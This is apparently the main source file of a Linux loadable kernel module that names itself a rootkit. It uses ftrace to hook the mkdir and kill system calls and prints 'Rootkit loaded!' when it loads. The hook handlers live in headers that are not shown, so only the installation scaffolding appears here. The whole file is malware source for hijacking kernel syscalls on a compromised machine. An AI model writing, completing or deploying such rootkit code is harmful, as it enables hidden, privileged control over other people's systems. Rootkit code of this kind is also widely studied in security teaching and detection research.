#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/syscalls.h>

#include "hook.h"
#include "hooks.h"

MODULE_LICENSE("GPL");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

static struct ftrace_hook hooks[] = {
	HOOK("sys_mkdir", hookMkdir, &origMkdir),
	HOOK("sys_kill", hookKill, &origKill),
};

static int __init rootkitInit(void) {
	int err;
	pr_info("Loading kernel module...\n");
	
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if (err) return err;

	pr_info("Rootkit loaded!");
	return 0;
}

static void __exit rootkitExit(void) {
	pr_info("Unloading kernel module...\n");
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	pr_info("Rootkit unloaded!");
}

module_init(rootkitInit);
module_exit(rootkitExit);
